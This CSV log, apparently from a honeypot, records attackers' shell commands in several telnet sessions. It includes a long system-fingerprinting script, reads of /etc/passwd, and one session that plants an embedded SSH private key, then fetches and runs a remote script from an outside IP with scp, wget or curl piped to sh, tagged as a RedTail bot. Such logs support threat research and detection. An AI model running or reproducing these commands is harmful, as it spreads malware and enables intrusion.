timestamp,src_ip,session,input,failed
2026-09-10 03:46:10.763803+00:00,72.255.33.193,9ffab361bd8d,start,False
2026-09-10 03:46:10.765138+00:00,72.255.33.193,9ffab361bd8d,start ,True
2026-09-10 03:46:10.766346+00:00,72.255.33.193,9ffab361bd8d,enable,False
2026-09-10 03:46:10.767645+00:00,72.255.33.193,9ffab361bd8d,enable ,True
2026-09-10 03:46:10.769136+00:00,72.255.33.193,9ffab361bd8d,config terminal,False
2026-09-10 03:46:10.770234+00:00,72.255.33.193,9ffab361bd8d,config terminal,True
2026-09-10 03:46:10.771418+00:00,72.255.33.193,9ffab361bd8d,system,False
2026-09-10 03:46:10.772361+00:00,72.255.33.193,9ffab361bd8d,system ,True
2026-09-10 03:46:10.773718+00:00,72.255.33.193,9ffab361bd8d,linuxshell,False
2026-09-10 03:46:10.775031+00:00,72.255.33.193,9ffab361bd8d,linuxshell ,True
2026-09-10 03:46:10.775938+00:00,72.255.33.193,9ffab361bd8d,su,False
2026-09-10 03:46:10.782436+00:00,72.255.33.193,9ffab361bd8d,shell,False
2026-09-10 03:46:10.783828+00:00,72.255.33.193,9ffab361bd8d,shell ,True
2026-09-10 03:46:10.785025+00:00,72.255.33.193,9ffab361bd8d,sh,False
2026-09-10 03:46:10.799309+00:00,72.255.33.193,9ffab361bd8d,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x44\x41\x57\x47\x57',False
2026-09-10 03:46:10.809280+00:00,72.255.33.193,9ffab361bd8d,/bin/busybox echo -e \x4b\x44\x41\x57\x47\x57,True
2026-09-10 04:07:58.597432+00:00,195.178.110.232,4b7c27e69bfd,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n ""$v"" ] && { printf '%s\n' ""$v""; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' ""$v"") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n ""$v"" ] && { printf '%s\n' ""$v""; exit; }; done; for c in arch 'busybox arch' 'toybox arch'; do v=$($c 2>/dev/null) && [ -n ""$v"" ] && { printf '%s\n' ""$v""; exit; }; done; printf '%s\n' unknown); uptime=$(IFS= read -r v < /proc/uptime && printf '%s\n' ""$v"" || cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null || toybox cat /proc/uptime 2>/dev/null) 2>/dev/null; cpus=$(unset OMP_NUM_THREADS OMP_THREAD_LIMIT; for c in nproc /usr/bin/nproc 'busybox nproc' 'toybox nproc'; do v=$($c 2>/dev/null) || continue; case $v in ''|*[!0-9]*) continue ;; esac; [ ""$v"" -gt 0 ] 2>/dev/null && { printf '%s\n' ""$v""; exit; }; done; for a in awk 'busybox awk' 'toybox awk'; do $a 'BEGIN { exit 0 }' </dev/null 2>/dev/null && break; done; v=$($a 'function count(s, a,b,n,i,t,m) { gsub(/[[:space:]]/,"""",s); n=split(s,a,"",""); for(i=1;i<=n;i++) { if(a[i]!~/^[0-9]+(-[0-9]+)?$/) return 0; m=split(a[i],b,""-""); if(m==2 && b[2]+0<b[1]+0) return 0; t+=(m==2?b[2]-b[1]+1:1) } return t } BEGIN { while((getline s < ""/proc/self/status"")>0) if(s~/^Cpus_allowed_list:/) { sub(/^[^:]*:/,"""",s); n=count(s); if(n>0) { print n; exit } } }' 2>/dev/null); [ -n ""$v"" ] && { printf '%s\n' ""$v""; exit; }; for c in getconf 'busybox getconf' 'toybox getconf'; do v=$($c _NPROCESSORS_ONLN 2>/dev/null) || continue; case $v in ''|*[!0-9]*) continue ;; esac; [ ""$v"" -gt 0 ] 2>/dev/null && { printf '%s\n' ""$v""; exit; }; done; v=$($a 'BEGIN { if((getline s < ""/sys/devices/system/cpu/online"")>0 && s~/^[0-9]+(-[0-9]+)?(,[0-9]+(-[0-9]+)?)*$/) { k=split(s,a,"",""); for(i=1;i<=k;i++) { m=split(a[i],b,""-""); if(m==2 && b[2]+0<b[1]+0) { n=0; break } n+=(m==2?b[2]-b[1]+1:1) } if(n>0) { print n; exit } } while((getline s < ""/proc/cpuinfo"")>0) { if(s~/^[[:space:]]*processor[[:space:]]*:[[:space:]]*[0-9]+[[:space:]]*$/ || s~/^[[:space:]]*processor[[:space:]]+[0-9]+:/) n++; if(s~/^[[:space:]]*#[[:space:]]*processors[[:space:]]*:/) { sub(/^[^:]*:/,"""",s); p=s+0 } } if(n>0) print n; else if(p>0) print p }' 2>/dev/null); printf '%s\n' ""${v:-unknown}""); cpu_model=$(for a in awk 'busybox awk' 'toybox awk'; do $a 'BEGIN { exit 0 }' </dev/null 2>/dev/null && break; done; r() { [ -r ""$1"" ] || return; while IFS= read -r s || [ -n ""$s"" ]; do printf '%s\n' ""$s""; done < ""$1""; }; v=$({ lscpu 2>/dev/null || busybox lscpu 2>/dev/null || toybox lscpu 2>/dev/null; printf '\n@@CPUINFO@@\n'; r /proc/cpuinfo; printf '\n@@MIDR@@\n'; for f in /sys/devices/system/cpu/cpu[0-9]*/regs/identification/midr_el1; do r ""$f""; done; } | $a 'function trim(s) { gsub(/^[[:space:]]+|[[:space:]]+$/, """", s); return s } function useful(s, t) { t=tolower(trim(s)); return t!="""" && t!~/^(unknown|undefined|unspecified|not specified|not available|not present|not installed|default string|to be filled by o\.e\.m\.|n\/a|none|null|\(null\)|-|(0x)?[0-9a-f]+)$/ && t!~/^(unknown|unidentified|unrecognized)([[:space:]]|$)/ && t!~/^(armv[0-9]+(-compatible)?|aarch64|arm64|arm)([[:space:]]+processor|[[:space:]]*\(|$)/ && t!~/^(armv[0-9]+|aarch64|arm64|arm|processor|cpu|riscv(32|64)?|risc-v|x86_64|amd64|i[3-6]86|ppc64(le)?|powerpc|loongarch64|s390x)$/; } function number(s, n,i,d) { s=tolower(trim(s)); n=0; if(s~/^0x[0-9a-f]+$/) { for(i=3;i<=length(s);i++) { d=index(""0123456789abcdef"",substr(s,i,1))-1; n=n*16+d } return n; } return s~/^[0-9]+$/ ? s+0 : -1; } function addname(s) { if(useful(s) && !names[s]++) name[++nn]=s } function arm(impl,part, id,s) { impl=number(impl); part=number(part); if(impl<0 || impl>255 || part<0 || part>4095) return; id=sprintf(""%02x:%03x"",impl,part); if(ids[id]++) return; s=parts[id]; if(s=="""") s=""ARM implementer=0x"" substr(id,1,2) "" part=0x"" substr(id,4); core[++nc]=s; } function addraw(s) { if(s!="""" && !rawseen[s]++) raw[++nr]=s } function flush() { addname(model); if(implementer!="""" && part!="""") arm(implementer,part); if(mvendor!="""" || march!="""" || mimp!="""") addraw(""RISC-V mvendorid="" mvendor "" marchid="" march "" mimpid="" mimp); model=implementer=part=""""; mvendor=march=mimp=""""; } function table(impl,s, a,b,n,i) { n=split(s,a,"" ""); for(i=1;i<=n;i++) { split(a[i],b,""=""); parts[impl "":"" b[1]]=b[2] } } function output(a,n, i) { for(i=1;i<=n;i++) printf ""%s%s"",(i>1?"" + "":""""),a[i] } BEGIN { table(""41"",""b76=ARM1176 c05=Cortex-A5 c07=Cortex-A7 c08=Cortex-A8 c09=Cortex-A9 c0d=Cortex-A17 c0e=Cortex-A17 c0f=Cortex-A15 d01=Cortex-A32 d02=Cortex-A34 d03=Cortex-A53 d04=Cortex-A35 d05=Cortex-A55 d06=Cortex-A65 d07=Cortex-A57 d08=Cortex-A72 d09=Cortex-A73 d0a=Cortex-A75 d0b=Cortex-A76 d0c=Neoverse-N1 d0d=Cortex-A77 d0e=Cortex-A76AE d40=Neoverse-V1 d41=Cortex-A78 d42=Cortex-A78AE d44=Cortex-X1 d46=Cortex-A510 d47=Cortex-A710 d48=Cortex-X2 d49=Neoverse-N2 d4a=Neoverse-E1 d4b=Cortex-A78C d4d=Cortex-A715 d4e=Cortex-X3 d4f=Neoverse-V2 d80=Cortex-A520 d81=Cortex-A720 d82=Cortex-X4 d84=Neoverse-V3 d85=Cortex-X925 d87=Cortex-A725""); table(""42"",""00f=Brahma-B15 100=Brahma-B53 516=ThunderX2""); table(""43"",""0a0=ThunderX 0a1=ThunderX-88XX 0a2=ThunderX-81XX 0a3=ThunderX-83XX 0af=ThunderX2-99xx""); table(""46"",""001=A64FX""); table(""4e"",""000=Denver 003=Denver-2 004=Carmel""); table(""50"",""000=X-Gene""); table(""51"",""001=Oryon 00f=Scorpion 02d=Scorpion 04d=Krait 06f=Krait 201=Kryo 205=Kryo 211=Kryo 800=Falkor-V1/Kryo 801=Kryo-V2 802=Kryo-3XX-Gold 803=Kryo-3XX-Silver 804=Kryo-4XX-Gold 805=Kryo-4XX-Silver c00=Falkor c01=Saphira""); table(""c0"",""ac3=Ampere-1 ac4=Ampere-1a""); } /^@@CPUINFO@@$/ { section=1; next } /^@@MIDR@@$/ { flush(); section=2; next } section==2 { s=tolower(trim($0)); sub(/^0x/,"""",s); if(s!~/^[0-9a-f]+$/ || length(s)<8) next; s=substr(s,length(s)-7); arm(""0x"" substr(s,1,2),""0x"" substr(s,5,3)); next; } section==1 && /^[[:space:]]*$/ { flush(); next } { pos=index($0,"":""); if(!pos) next; key=tolower(trim(substr($0,1,pos-1))); value=trim(substr($0,pos+1)); if(section==0) { if(key==""model name"" && useful(value) && !lsseen[value]++) ls[++nl]=value; if(key==""bios model name"" && useful(value) && !biosseen[value]++) bios[++nb]=value; next; } if(key==""processor"" && value~/^[0-9]+$/) flush(); if(key==""cpu implementer"") implementer=value; if(key==""cpu part"") part=value; if(key==""mvendorid"") mvendor=value; if(key==""marchid"") march=value; if(key==""mimpid"") mimp=value; if(key~/^(model name|cpu model|cpu|uarch|cpu type|processor)$/ && useful(value)) { if(model=="""" || key==""model name"" || key==""uarch"") model=value; } if(key~/^processor[[:space:]]+[0-9]+$/ && value~/machine[[:space:]]*=/) { s=value; sub(/^.*machine[[:space:]]*=[[:space:]]*/,"""",s); sub(/[,[:space:]].*$/,"""",s); if(s!="""") addraw(""IBM S/390 machine "" s); } } END { flush(); if(nn>0) { output(name,nn); if(nc>1) { printf "" [cores: ""; output(core,nc); printf ""]"" } } else if(nc>1) { output(core,nc); } else if(nl>0) { output(ls,nl); } else if(nb>0) { output(bios,nb); } else if(nc>0) { output(core,nc); } else if(nr>0) { output(raw,nr); } if(nn+nc+nl+nb+nr>0) print """"; }' 2>/dev/null); [ -n ""$v"" ] && { printf '%s\n' ""$v""; exit; }; if ! $a 'BEGIN { exit 0 }' </dev/null 2>/dev/null; then v=$(emit() { [ -n ""$1"" ] || return; case ""$seen"" in *""|$1|""*) return ;; esac; printf '%s%s' ""$sep"" ""$1""; sep=' + '; seen=""$seen|$1|""; }; rec() { if [ -n ""$n"" ]; then emit ""$n""; elif [ -n ""$i"" ] && [ -n ""$p"" ]; then emit ""ARM implementer=$i part=$p""; fi; n= i= p=; }; n= i= p= seen= sep=; if [ -r /proc/cpuinfo ]; then while IFS=: read -r k x || [ -n ""$k$x"" ]; do k=${k#""${k%%[![:space:]]*}""}; k=${k%""${k##*[![:space:]]}""}; x=${x#""${x%%[![:space:]]*}""}; x=${x%""${x##*[![:space:]]}""}; case ""$k"" in '') rec ;; processor) case ""$x"" in *[!0-9]*) ;; *) rec ;; esac ;; 'CPU implementer') i=$x ;; 'CPU part') p=$x ;; 'model name'|'Model Name'|'cpu model'|cpu|uarch|'cpu type'|Processor) case ""$x"" in ''|[Uu][Nn][Kk][Nn][Oo][Ww][Nn]*|[Nn]/[Aa]|[Aa][Rr][Mm]*[Pp]rocessor*|[Aa][Aa][Rr][Cc][Hh]64*) ;; *) case ""$x"" in *[!0-9]*) n=$x ;; esac ;; esac ;; esac; done < /proc/cpuinfo; rec; fi); [ -n ""$v"" ] && { printf '%s\n' ""$v""; exit; }; fi; v=$(for d in /sys/firmware/devicetree/base /proc/device-tree; do [ -d ""$d/cpus"" ] || continue; for f in ""$d""/cpus/*/compatible; do [ -r ""$f"" ] || continue; tr '\000' '\n' < ""$f"" 2>/dev/null || busybox tr '\000' '\n' < ""$f"" 2>/dev/null || toybox tr '\000' '\n' < ""$f"" 2>/dev/null; done; break; done | $a 'NF && !seen[$0]++ { printf ""%s%s"",n++?"" + "":""CPU compatible: "",$0 } END { if(n) print """" }' 2>/dev/null); printf '%s\n' ""${v:-unknown ($arch)}""); gpu_info=$(for a in awk 'busybox awk' 'toybox awk'; do $a 'BEGIN { exit 0 }' </dev/null 2>/dev/null && break; done; r() { [ -r ""$1"" ] || return; while IFS= read -r s || [ -n ""$s"" ]; do printf '%s\n' ""$s""; done < ""$1""; }; v=$(for c in lspci 'busybox lspci' 'toybox lspci'; do p=$($c -Dnn 2>/dev/null) || p=; [ -n ""$p"" ] || { p=$($c -nn 2>/dev/null) || p=; }; [ -n ""$p"" ] || { p=$($c 2>/dev/null) || p=; }; p=$(printf '%s\n' ""$p"" | $a '{ s=tolower($0) } s~/\[03[0-9a-f][0-9a-f]\]/ || s~/(vga compatible|3d|display) controller/ || s~/(^|[[:space:]])(class[[:space:]]+)?03[0-9a-f][0-9a-f]:[[:space:]]/ { if(!seen[$0]++) print }' 2>/dev/null); [ -n ""$p"" ] && { printf '%s\n' ""$p""; break; }; done); if [ -n ""$v"" ]; then printf '%s\n' ""$v""; else for d in /sys/bus/pci/devices/*; do c=$(r ""$d/class""); case $c in 0x03????) x=$(r ""$d/vendor""); y=$(r ""$d/device""); printf '%s display controller [%s:%s]\n' ""${d##*/}"" ""${x#0x}"" ""${y#0x}"" ;; esac; done; fi; for d in /sys/class/drm/card[0-9]* /sys/class/drm/renderD[0-9]*; do [ -d ""$d/device"" ] || continue; case ${d##*/} in *-*) continue ;; esac; e=$(r ""$d/device/uevent""); case $e in *PCI_SLOT_NAME=*) continue ;; esac; p=$(CDPATH= cd -P ""$d/device"" 2>/dev/null && pwd -P); [ -n ""$p"" ] || continue; x=$(printf '%s\n' ""$e"" | $a '/^DRIVER=/ { sub(/^DRIVER=/,""""); print; exit }' 2>/dev/null); printf '%s DRM device: %s\n' ""$p"" ""${x:-unknown}""; done | $a '!seen[$0]++' 2>/dev/null); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); printf 'UNAME:%s\n' ""$uname""; printf 'ARCH:%s\n' ""$arch""; printf 'UPTIME:%s\n' ""$uptime""; printf 'CPUS:%s\n' ""$cpus""; printf 'CPU_MODEL:%s\n' ""$cpu_model""; printf 'GPU:%s\n' ""$gpu_info""; printf 'LAST:%s\n' ""$last_output""; printf 'FILTER:%s\n' ""$filter_output""",False
2026-09-10 04:39:28.352072+00:00,61.136.184.142,50db72e02b9d,uname -s -m,False
2026-09-10 04:47:57.328935+00:00,172.235.41.203,ad48d5cc0e48,Accept-Encoding: gzip,False
2026-09-10 04:47:57.330066+00:00,172.235.41.203,ad48d5cc0e48,Accept-Encoding: gzip,True
2026-09-10 04:47:57.330946+00:00,172.235.41.203,ad48d5cc0e48,,False
2026-09-10 05:00:30.296194+00:00,23.251.134.112,2aa609fc473e,,False
2026-09-10 05:36:30.679137+00:00,104.199.97.116,99fefb7b4bfa,,False
2026-09-10 05:39:56.736228+00:00,103.100.211.183,9cf26498317b,id,False
2026-09-10 05:39:56.739736+00:00,103.100.211.183,9cf26498317b,cat /etc/passwd,False
2026-09-10 05:39:56.744742+00:00,103.100.211.183,9cf26498317b,"echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",False
2026-09-10 05:39:58.984391+00:00,103.100.211.183,9cf26498317b,enable,False
2026-09-10 05:39:58.985533+00:00,103.100.211.183,9cf26498317b,enable ,True
2026-09-10 05:39:58.986919+00:00,103.100.211.183,9cf26498317b,system,False
2026-09-10 05:39:58.988102+00:00,103.100.211.183,9cf26498317b,system ,True
2026-09-10 05:39:58.989156+00:00,103.100.211.183,9cf26498317b,shell,False
2026-09-10 05:39:58.990974+00:00,103.100.211.183,9cf26498317b,shell ,True
2026-09-10 05:39:58.991981+00:00,103.100.211.183,9cf26498317b,sh,False
2026-09-10 05:39:58.993765+00:00,103.100.211.183,9cf26498317b,bash,False
2026-09-10 05:39:59.001949+00:00,103.100.211.183,9cf26498317b,cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----,False
2026-09-10 05:39:59.007858+00:00,103.100.211.183,9cf26498317b,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW,False
2026-09-10 05:39:59.009381+00:00,103.100.211.183,9cf26498317b,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW ,True
2026-09-10 05:39:59.014701+00:00,103.100.211.183,9cf26498317b,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ,False
2026-09-10 05:39:59.017551+00:00,103.100.211.183,9cf26498317b,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ ,True
2026-09-10 05:39:59.022741+00:00,103.100.211.183,9cf26498317b,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg,False
2026-09-10 05:39:59.024328+00:00,103.100.211.183,9cf26498317b,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg ,True
2026-09-10 05:39:59.031734+00:00,103.100.211.183,9cf26498317b,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9,False
2026-09-10 05:39:59.034014+00:00,103.100.211.183,9cf26498317b,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9 ,True
2026-09-10 05:39:59.037603+00:00,103.100.211.183,9cf26498317b,Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=,False
2026-09-10 05:39:59.044352+00:00,103.100.211.183,9cf26498317b,-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no,False
2026-09-10 05:39:59.045808+00:00,103.100.211.183,9cf26498317b,-----END OPENSSH PRIVATE KEY----- > key.ppk; echo StrictHostKeyChecking no,True
2026-09-10 05:39:59.068618+00:00,103.100.211.183,9cf26498317b,"UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e ""\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B""",False
2026-09-10 05:39:59.070548+00:00,103.100.211.183,9cf26498317b,,False
2026-09-10 05:56:45.353908+00:00,165.154.11.172,da88db3cf151,,False
2026-09-10 06:25:42.640026+00:00,34.78.132.213,3a63a8f01b7b,,False
